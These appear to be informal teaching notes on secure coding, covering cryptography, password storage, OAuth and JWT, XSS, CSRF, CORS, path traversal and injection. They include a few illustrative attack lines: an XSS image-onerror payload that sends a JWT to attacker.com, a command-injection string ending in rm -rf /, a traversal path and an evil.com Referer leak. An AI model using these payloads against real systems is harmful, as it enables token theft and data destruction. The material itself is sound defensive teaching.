Secure Coding notes.txt
=== context food for your AI friend tomorrow

=== base64encoding = transform a series of bytes into a sequence of characters in a certain alphabet (eg: A-Z, a-z, 0-9, +, /)
=== checksum (eg CRC, SHA) 
  - one part of the data is used to check there for typos in the remaining text
  - RO[49]BTRLRONCRT0211064001 -> 49 is the checksum https://wise.com/gb/iban/checker

=== salting/nonce = add random string to increase the entropy to defend against rainbow table attacks
  - this string is harder to attack by letter frequency
  - adding 1 random letter in between any other 2 = 
  - tahbics sdterfignhg ijs hkalrmdneor tpo aqtrtsaucvk bwy lxeytztqerr farbecqdueefngchy

=== encryption = hide/protect sensitive data

=== symmetric encryption = same K is used for encryption and decryption
  - you need a large key; rotate it
  - very fast, CPU-efficient

=== asymmetric encryption
  = what is encrypted with the public key can only be decrypted with the private key and vice versa
  - private key (v) = only you have it, keep it secret (eg: USB stick, on your drive, on your badge)
  - public key (p) = everyone can have it, share it freely

=== A) Storing a password to validate an incoming password
  - Storing Human User Password in the DB (= Antipattern)
    ‚ò¢Ô∏è Humans suck at finding passwords: One pass in all systems; when expired vic08REN! -> ic08REN!v
    ‚úÖ DON'T, use SSO!
  - to check if the user:pass combination they give ‚≠êÔ∏èmatches‚≠êÔ∏è what you know => don't ENCRYPT password, but bcrypt them
  - practical example: actuator using Basic Authorization with user/pass, checked vs {bcrypt}-ed password in your properties
  USER table:
  | id | username | plain-text password | encrypted password  using the same nonce|
  |----|----------|---------------------|----
  | 1  | alice    | password123         | oeuty47934y975263579
  | 2  | bob      | password123         | oeuty47934y975263579

  - how to increase the strength of existing user bcrypted passwords?
    - ‚ùåforcefully ask all users to rest their passwordsüò±ü§¢ü§¢ü§¢ü§Æü§Æü§Æ
    - ‚úÖat the very next login, when plaintext password comes in on the network, check the strength of the bcrypted value in DB and if < 12, re-bcrypt(12) => overwrite the DB value

=== B) Storing a password to send to another system
  - You need the plain-text password. 
  - Where to store it/get it from?
  > environment variables export DB_PASSWORD 
  > startup.sh on prod mahine: command line java -jar -Ddb.password=08927
  > Vault ‚≠êÔ∏è
    + no plain text on some random machine
    + `top` prints java command line including -Ddb.password
    + write history/audit: what user changed that password + when 
    + read access history: when was this key actually last used?
    + key rotation [even without instances' restart]

=== The GDPR "right to be forgotten"
  - hard if custoemr data stored in 10 DB on 3 continents, 3 Kafka brokers and 1 Rabbit, + a data lake
  - All the data you ever store about that single customer, wherever you store it or send it on message or wherever it is, it is encrypted with the same personal symmetric key of that human. If they come to you and they want to be forgotten, you just burn the key. And there is a central system which manages the GDPR PII keys of all the individuals, and you just have to go to that system, nuke the key, and you've forgotten the guy. 
  - Also avoid copying the information of that person all over the place, especially in clouds. You anonymize and de-anonymize when you go off or back on prem. 


=== Hashing
  - Features:
    - highly sensitive to changes
    - one-way (can't get the original data)‚ùå
    - low-collision
  - Example algorithms: 
    - MD5(‚ò†Ô∏èRIP)
    - SHA-256, -512 bits = 64 bytes
  - Practical use-case: 
    - comparing big data sets: 
    hash(payments_10G_1.xml) === hash(payments_10G_2.xml) 
      => very very very...very likely they contents are the same.
    utorrent

=== Digital Signature
  you receive a .pdf (1MB) from IRS
  - Goal1: non-repudiation = prove in court that the sender of M is IRS
  - Goal2: integrity protection = no one tampered the M contents
  - you get M + sha(M) = not enough: a üòàMan in the middle could swap originals with M' + sha(M')
  - you get M + enc(sha(M),v_irs)
  - a digital signature =  hash(message) asym encrypted with senders' private key
  #1‚úÖ: you honour, if I take dec(enc(sha(M),v_irs),p_irs) = sha(M)
  #2‚úÖ: üòàchanges M->M'; you received M' + enc(sha(M),v_irs) => 
          dec(enc(sha(M),v_irs),p_irs) = sha(M) != sha(M') => tampered with!‚ùå
  ‚ò¢Ô∏è Collisions (don't use MD5). üòà finds a M' whose hash = M
  ‚ò¢Ô∏è üòà generates a new p_irs', v_irs' and provides me with a forged p_irs'

=== Propagate safely public keys
  - no public key shallt ever travel the network unsigned
  - CA (Certificate Authorities)
  - [p + digsig(p, CA)] = .cer
  - unsigned=self-signed certificate = no CA has signed that pub key

=== https:// = SSL/TLS
  - to open https: you have to get a .cer(pub key signed by a CA) issued for your host/domain by a CA. csr => infra team => .cer + private key
    - keep private key secret‚ö†Ô∏è in your cacerts
    - send your .cer to any party which recongizes its' signer CA
    ¬± add in your caller's cacerts the CA .cer as trusted
    - all .cer expire -> how to renew them?
  - all network traffic is sym encrypted with a session key established via the server's .cer = SSL handshake
  - to connect to you, the client jvm/browser must trust your .cer or your its' issuer CA  

=== 2TLS, two-way ssl, client-cert

=== Security by Obscurity = ‚ùåüí©üí©üí©üí©
  = Let's assume the hackers don't know our code base 
  - Because of the S-bomb and library vulnerabilities mania in the US, they decided to rewrite 15-year-old codebase of Java entirely in C++ without using any library or open source. WTFWTFWTFWTFWTFWTFWTFWTFWTFWTF; they reinvented wheel intead of updating their wheel

=== CVE handling
  - upgrade üëç
    - if libA -> libX.v1
    - libX.v1 (vulnerable) => v2 causes üí•Class/MethodNotFoundError in libA ar runtime
    - libA üîº, libB->libAüîº ... SpringBoot version++
    => testing again, bossüôÅ
    => Victor vulnerabilities are the best thing that happened to software crafters because now we have time to refactor everything when we upgrade Spring Boot. we'll test everything, anyway!
  - switch to another !worse libraryü§û
  - fix (DIY):
    > fork and fix
    > contribute a fix to OSS!
    > shadowing classes: reimplementing the same class in your src/main to replace the vulnerableü§¢ü§Æ
  - downgrade lib
  - ignoreü§û

=== file deserialization
  - XXE doctype /passwd
  - XML bomb expanding to 3 GB RAM OOM
  - YAML bomb
  - java de/serialization: save/load state a java instance as byte[] to eg a file/RMI in a Java-specific format

=== FILE VALIDATION
  - Check magic bytes (Tika), not just the file extension or Content-Type header
  - Whitelist allowed extensions ‚Äî whitelisting is always stronger than a denylist
  - Run an antivirus scan on uploaded content before processing

=== PATH TRAVERSAL
  - Never write to disk using the user-supplied filename ‚Äî it can escape the target directory (e.g. ../root/.bashrc)
  - Whitelist filename chars with a strict regex; blocking only ".." and "/" is weaker
  - Best fix: generate a random filename on disk (upload-<UUID>.dat), store the original name in the DB

=== SHELL / COMMAND INJECTION
  - Never concatenate user input into Runtime.exec() ‚Äî attackers inject extra commands (e.g. a & rm -rf /)
  - The random-filename fix above also eliminates this surface

=== DENIAL OF SERVICE
  - Memory: limit upload size (Tomcat default 2 MB) to prevent 500 concurrent x 2 MB = 1 GB OOM
  - Thread starvation: long processing on HTTP threads exhausts Tomcat's pool (200 threads)
    => liveness probes time out => Kubernetes kills the pod => fix with async offloading
  - Unbounded queue: ForkJoinPool.commonPool() has no queue limit
    => write to a temp file first, queue only a lightweight reference (e.g. a file path)
  - Disk exhaustion: clean up temp files after processing and enforce a max-age (e.g. 7 days)

=== RESILIENCE
  - In-memory async work is lost on crash or redeploy / rolling restart
  - Prefer durable async: publish to Rabbit/Kafka, or use the Inbox Table Pattern
    (insert a TASK(status=PENDING) row in DB so work survives restarts)

"auth"=?
  - authn authentication = who are you
  - authz authorization = what can you do?
    a) features
    b) on data (aka jurisdiction)
      Although your user has access to approve loans, you can only do that for the loans request submitted to your branch. Even worse, you can't even see the loan contracts of other branches.

=== XXS = X/Cross Site Scripting: via a stupid website/app, hacker runs scripts in the victim's browser
  - we need 2 users with access to an app: hacker + victim
  - the hacker injects a malicious script in app (eg: a comment on a blog post) which is saved in DB by the backend
  - the victim user later views that comment and the script runs in their browser  where is rendered with .innerHTML
  - Exploits: "what can the hacker's JS code do bad in the bro of the victim(admin)"
    a) fetch(POST, 'employee/{victimId}/salary/increase' {a lot})
    b) impersonate victim üëë againts the hacked app
    -> send out the victim's session cookie (JSSESSION)
      ‚ö†Ô∏èIMPOSSIBLE by default as that cookie is httpOnly=true ie not accessible from js code
    -> JWT AccessToken is stored in localStorage/var accessible (YUMMY)
    <img src="x" onerror="fetch('http://attacker.com/steal?cookie='+jwt +' usable for '+document.domain)"> for until jwt.exp = 5m..1h
    ! the JWT might be usable to more apps than the victim app
  - fixes:
    a) use Rich Text editor sending markdown‚ù§Ô∏è (‚àÑscripts) **bold** _italic_
    b) allow-list html tags using org.owasp.html.Sanitizers
      > done in BE whenever you receive/return HTML to FE
      > ‚≠êÔ∏è via an annotation on Dto + @Aspect
      > Paranoia: HttpFilter in Servlet that would automatically sanitize (allow list) any string in any JSON payload in a request or a response => one of those json fields contained encoded data that happened to contain "<"

=== CORS = Cross Origin Resource Sharing
  - Browsers will check with backend you want to call if they accept JS calls done by .js files loaded from a different domain


=== Patient Data Leak Vulnerability case study
  ‚ùå URL-scanning attack for sequential IDs
  - if a hacker sees a numeric id 1002 => they will ask for 1001, for>>
  - ORACLE reigns
  => use UUID v4/7 especially towards any WWW user / or an Intranet of 100.000 employees
  ‚ùå POST/PUT's body should NOT mirror data back to client. Design mistake; POST creates, not returns = CQRS style
  => dear FE (!not fullstack, jr FE), I don't need to give you back the patient data.  Just send it to me!
    have reads going only via GET (properly secured)

  - async handling of a create.X
  Usecase: In an e-shop, someone places an order, but the ID of the order gets generated after a rabbit queue, so you can't give the ID back to the UI. => go for client-generated UUIDs (generate the id before the rabbit)

=== Authn = who you are
  - we authenticate a "Principal" (human / machine)
  - Form to human - ‚ò¢Ô∏è‚ùådon't> let pros do it IdP Okta, KeyCloak, 2FA
  - Basic Auth: / https request header "Authorization: Basic base64(user:pass)"
    > legacy/ops endpoints
    curl http://localhost:8080/actuator/beans -u actuator:actuator         
    curl http://localhost:8080/actuator/beans -H "Authorization: Basic YWN0dWF0b3I6YWN0dWF0b3I="
  - ApiKey more opaque vs Basic for outside developers/users
    curl http://localhost:8080/api/trainings -H "x-api-key: strongapikey" -v
  - X.509 .cer
  - SAML2 aka WebSSO (single-sign-on per day for a human)
  - JWT OAuth AccessToken 
    "Authorization: Bearer <jwt>"
    JWT = JSON digitally signed by Okta
  - PreAuthenticated
    Implementing & configuring correctly parsing JWT  tokens/Basic/.cer is risky do reimplement in Spring/Quarkus/Ktor/py/c#/pearl.
    a) instead implement a lightweight 'security proxy' (eg in py) Make that security proxy the only process accessible in the operating system, and have the actual application running as another process called only locally by the security proxy within the same operating system.
    -- sends to your app on. headers 
    x-user
    x-user-roles (extracted from JWT token) 
    b) Istio

=== ThreadLocal 
  - Once you set such a variable to a value in a thread, later in that same thread you can get the variable out.  = immune to race conditions
  - uses in BE:
  a) MDC: %X{key} in logging patterns, after MDC.put("key", 1)
  b) SecurityContext
  c) @Transactional/JDBC Connection
  d) TraceID/OTEL

=== Spring Security
  - SecurityContextHolder.getContext().getAuthentication() = who is the current user
  - SecurityContextHolder.getContext().getAuthentication().getAuthorities() = what roles/permissions
  - ! mind changing the thread

=== Broken Authorization üëëüëë
  hide the button in FE, leave the BE unsecured
  üëç RULE: When you have to restrict security of your application, start with backend. See the error and then hide the button. 


=== coroutines + thread local in a spring app
  - https://docs.spring.io/spring-framework/reference/languages/kotlin/coroutines.html#coroutines.propagation


=== user role(s) comes from:
  - DB
  - from a LDAP call
  - JWT bearer

=== Data Jurisdictions / ACLs
  - You have 1 million customers in your database. An employee can only see the customers registered for their own bank branch. 
  - "You shouldn't even see those customers out of your branch."
    a) sql += "AND ..." to all queries!!!! OMGüò±
      ü§ì Let me create an SQL post processor that, if I see you select from the customer table, I will automatically add a WHERE to your SQL condition to restrict the visibility to only what you are allowed to see. I will get that information from the thread local. 
    b) separate schema / country
    c) separate instance / country $$

=== Authz = what you can do
  - permitall
  - url-based
  - annotation
  - propagation of SecurityContext
  - non-http


=== CSRF
  - You open up your online banking website in the first tab of your browser. 
  - Your bank is not using modern technologies. 
  - The web page is server-side generated with: Java Server Pain (.jsp), jsf, vaadin, gwt, velocity; no react, angular, vue...
  - In the second tab of the browser, you open Pirate Bay / annas archive. 
  - On that website, random people can post comments. 
  - And that website is vulnerable to XSS injection. You can actually include HTML in their comments. Or just the site wants to hack you? 

  You are imune to CSRF iff any of:
  - use SPA  (Angular..) not server-side generated HTML. 
  - Use JWT instead of Cookies for authn, as they are not sent automatically by the browser to the server, but only when you explicitly add them in the header of your fetch/ajax calls.
  - SameSite=Lax (or Strict if you can) << RESEARCH

=== CORS = Cross-Origin Resource Sharing
  - You went international. Clients are on seven continents. 
  - To display your web page faster in Australia, you rely on a content delivery network (CDN) to ship HTML, JavaScript, images, and CSS to your clients.
  - For the .js of your page, it is loaded from cdn.bank.com.  
  - That JavaScript attempts to do a JavaScript REST call with  fetch() against api.bank.com. 
  - The course protection is implemented by browsers. 
  - When the browser sees the fetch attempting to reach another domain, it would pause the call and, before allowing it to continue, do a preflight check with api.bank.com, asking it if it accepts JavaScript calls coming from cdn.bank.com.
  doing a OPTION call to api.bank.com with Origin: cdn.bank.com 
  

Can CORS be used to prevent XSS? 
NO
XSS = hacker makes your browser execute üòà js
  ‚áí against the same application
  ‚áí fetch("hacker-site?jwt_i_got="+yourAT)
      hacker-site will accept any cors

=== Data leakage beween users
  - a website added transactions to a global static/ThreadLocal list? When Next Person logged on, that list of transactions just got added to, so then they could see your own transactions and the transaction from the person that looked at it before. 


=== JWT design
  - what payload
    a) global roles: "ADMIN" ("realm" in KeyCloak) 
    b) app-specific roles: {"trainings":["ADMIN"],+30 apps} ("resource" in KeyCloak) 
    c) control-freak: {"trainings":["TRAINING_DELETE"+50 more],x 30 apps}
      üòä revoke individual tiny features
      üòä strict visibility in a central place ü§Ø‚ù§Ô∏è
      üôÅ coupling: Whenever you add a new button to any application, you have to call those guys. 
      üôÅ size of token header >>>> payload of requests! 1MB
      ‚áí OAuth scopes allow to request a token of just 1-2 apps
      ‚áí TRAINING_DELETE->A124üí©/ TD
      ‚áí gzip token
      ‚áí TRAINING_WRITE instead of _DELETE, _EDIT, _CREATE
      ‚áí don't bring any roles in token, but have apps call GET /user/{id}/roles/{app} Entitlements app = +1 network call for all endpoints (üò±failure, üò±bottleneck, üò±latency)
  - online/offline validation
  - [a]symmetric signed
  - what expiration
  - JWT exchange 
  - JWT={header, json_payload, digsig(json_payload, v_AS)}

=== AccessToken Validation
  - if opaque, call IdP to validate it = ONLINE validation
    üôÅ floods AuthServer
  - if JWT, validate signature with the public key of the IdP you have its .cer in your trust store
    üôÅ Burns CPU, rotate .cer


=== OAuth https://www.youtube.com/watch?v=5cQNwifDq1U on this branch amex26oauth
  - why: decouple authn/authz from your app,
  - OAuth Access Token can opaque (think: random) or JWT (self-contained, signed by IdP)
  - OpenID Connect = OAuth + authn (who you are) + userinfo endpoint
  - Tokens: 
    - Access Token = for authz, sent to resource server (app you call with the token)
    - Refresh Token = long-lived, used to get new access tokens when they expire, not sent to resource server
    - ID Token = for authn, contains user info, sent to client app (SPA/mobile) after login, not sent to resource server
  - Actors: Resource Owner (human), Client (app), Authorization Server (eg: Okta), Resource Server (app your're calling with AT)
  - type of clients: confidential (backend) vs public (SPA/mobile)
  
  
=== Use-Case 1: backend doing Authorizatiob code Flow + session to the browser
  - commit "access code grant demo"
  - SSO (single sign on) for humans works via an SSO Cookie set by the IdP (eg: Okta) on the browser, which is sent to the IdP on login attempts, and if valid, the IdP returns an Access Token to the browser, which is then sent to your app.
  - Back-channel communication between your app and the IdP to exchange the Access Code for an Access Token
  - client secret for confidential clients
  - distributed logout is hard in SSO
  - JWT token contains: realm (global)

=== Use-Case 2: PKCE = JS frontend SPA gets an AT‚≠êÔ∏è to call a stateless‚ù§Ô∏è REST API
  - PKCE instead of Implicit Flow

=== Use-Case 3: Client Credentials Flow = machine-to-machine doing 
  - Use-Case: Stop the human AT earlier in the flow (to not expire, privacy)
  - Use-Case: @Kafka/Rabbit Listener / @Scheduler
  - Use-Case: Your company is using a 3rd party service using a Bearer AccessToken of my COMPANY.
    A 'service-proxy' app represents this 3rd party service into your ecosystem, 
    it makes no sense propagating employee JWTs out to that 3rd party service
  - There is a sort of a manager that would take care to refresh the access token
    whenever they expire before sending a call using that access token. 

  - OAuth Attacks ü§Ø [follow-up hour]


=== What if the refresh token gets stolen?
  - worst case: a hacker could use it ad infitum to produce more access tokens
  - Refresh Token Rotation can reduce the vulneability window to the exp of tha acces token

=== Access Token expires while in transit (exp: ~5m)
  - I can't mutate the 'exp' claim in JWT, as the JWT will not validate against its signature.
  - possible if a service calls take long to complete.
  - at 10:00:00 FE -‚≠êÔ∏è-> || BE1/ApiGatway -‚≠êÔ∏è-> || BE2 (takes 5min before calls) -‚≠êÔ∏è-> ||‚ùå‚ö†Ô∏èexpired BE3
  ‚áí refresh the access 2minutes in advance
  ‚áí don't propagate FE AT‚≠êÔ∏è between BackEnds/microservices;
    - instead BE1 get its own AT‚≠êÔ∏è (client-credential) identifies as a machine to call BE2
    - BE-BE via Basic
    - BE-BE over https: w/o identifying who the client is
    BE1 may send to BE2 username ¬± roles in payload (header)
  ‚áí Auto-Retry from FE iff op is idempotent 
  ‚áí Not A Problem - we don't call more than three microservices in a chain & Our services are lightning fast! 

=== AT Exchange
  - Audience change: Issue a token that the recipient service trusts based on your original token of the sender. 
  - Downscoping: Come with a very powerful token that can open 100 doors, and you exchange it with another token that can open two doors before giving it to an application of a lower security stance, of a lower trust. 
  - Act-as (impersonation) cf policies: üò±Ops head can impersonate other ops employees/users.

=== OAuth in Internet
  - scopes
  - You authorize the Facebook application to post in your name on your Twitter account. 
  - Scope is called post tweet. 
  The client application is Facebook. The authorization server is Twitter identity provider. The resource server is the Twitter API that you can call with the access token Facebook got. 
  - Social login w/ Google eg: you must register an app with google, free
  
=== Attacks
  Ref: https://datatracker.ietf.org/doc/html/rfc9700
  - Open-Redirectionüëë -- Valid Redirect URIs = "*"
    after login, AS will send code/AT to a üòà controller domain
  - Confused Deputy -- the RS does not validate if AT grants permission for its resources, doesn't check scopes/roles in JWT
  - AT Leak at RS -- a compromised service uses captured AT‚≠êÔ∏è to call other services
    ‚áí minimal AT permissions = hard to design ; hard to tell in complex eco what you'll do later with that token
    ‚áí network restrictions cross nodes
  - Referrer/Browser History Leak
    > if the page you open after AS redirects back with code you have an <img src="evil.com/img.gif"> the GET for that image automatically incldue a Referer: url reqyest with ?code=
    ‚áí solution redirect immediately to home
  - CSRF 
  - Code Injection
